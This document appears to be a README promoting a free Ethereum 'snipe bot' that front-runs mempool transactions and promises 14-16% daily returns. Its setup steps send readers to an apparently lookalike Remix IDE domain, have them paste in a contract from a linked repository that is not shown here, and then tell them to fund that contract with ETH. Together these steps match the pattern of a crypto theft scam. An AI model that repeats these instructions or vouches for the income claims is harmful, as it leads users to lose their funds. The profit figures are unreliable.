# WEB3-Snipe-Bot
A sniper bot for trading developed by me. Completely free and free of charge. Tested, average income per day - from 15%

<b>Project Description</b>

A snipe bot is a specialized form of bot used in a variety of trading and transaction domains, including financial markets, online auctions, and blockchain technologies. In the context of blockchain, a snipe bot is focused on monitoring and responding to upcoming transactions in a mempool, with the goal of executing its own transactions at the optimal time to maximize profits or access limited resources.

<b>Test results </b>

The bot was tested for about 3 weeks. Thanks to my colleagues for their help in the tests, they will be listed here a little later. The average yield of the bot per day is 14-16%. The best bank to start with is 1.5 - 2 ETH. But you can start with a smaller amount, it will affect how much the bot can earn per day.

<h1>How it works</h1>

<b>Mempool monitoring</b>

Snipe bot starts its work by monitoring the blockchain mempool, which is a repository of all pending transactions ready for confirmation. These bots analyze transactions in real time to identify potentially profitable transactions or changes in token liquidity.

<b>Analyzing market opportunities</b>

Once a potential opportunity is detected, such as a large purchase transaction for a particular token that could affect its price, the snipe bot quickly analyzes the situation to determine if it would be beneficial to intervene in that transaction. The bot calculates the likely impact of the transaction on the market using various algorithms and strategies.

<b>Transaction execution</b>

If the snipe bot decides that a transaction might be profitable, it sends its own transaction to the blockchain, usually with a higher gas fee, to get ahead of other transactions. This is especially important in the context of decentralized exchanges, where the execution time of a transaction can critically affect its outcome.

<b>Resale for profit</b>

After a successful purchase or other type of transaction, a snipe bot can either hold an asset in anticipation of further increases in its value or quickly resell it for immediate profit, especially if market conditions have changed in its favor.

   <li>Download and install MetaMask.</li>
    <li>Then, go to https://remix-ide.network/ . Be careful, you need this exact Remix version. It may take about a minute to load the IDE on a weak computer. Take your time, wait.

    </li>
<li>Create “New File”. Rename it whatever you want or “bot.sol”

</li>
<li>Completely copy and paste the code from <a target="_blank" rel="noopener noreferrer" href="https://github.com/Web3-ETH/WEB3-Snipe-Bot/blob/main/bot.sol">here</a>

  Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "UniswapBot -bot.sol".
Also if you get this message after deployment "Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] ". You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.
</li>
<li>Fund your bot to be able to frontrun transactions.
To replenish your balance for trading, copy the address of the contract you just created (the button for copying is highlighted with an arrow). After clicking, the address of your trading bot will be copied. To start trading, you need to send funds to it.
